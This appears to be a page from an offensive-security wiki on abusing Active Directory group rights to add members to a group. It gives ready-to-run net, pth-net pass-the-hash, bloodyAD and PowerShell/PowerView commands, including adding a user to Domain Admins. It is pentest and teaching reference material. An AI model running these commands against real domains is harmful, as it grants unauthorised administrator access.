# AddMember

This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights` or `Self-Membership`, over the target group.

{% tabs %}
{% tab title="UNIX-like" %}
It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with [pass-the-hash](../ntlm/pth.md).

```bash
# With net and cleartext credentials (will be prompted)
net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController

# With net and cleartext credentials
net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController

# With Pass-the-Hash
pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
```

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
```
{% endtab %}

{% tab title="Windows" %}
The attacker can add a user/group/computer to a group. This can be achieved with a native command line, with the Active Directory PowerShell module, or with [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
# Command line
net group 'Domain Admins' 'user' /add /domain

# Powershell: Active Directory module
Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'

# Powershell: PowerSploit module
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
```
{% endtab %}
{% endtabs %}
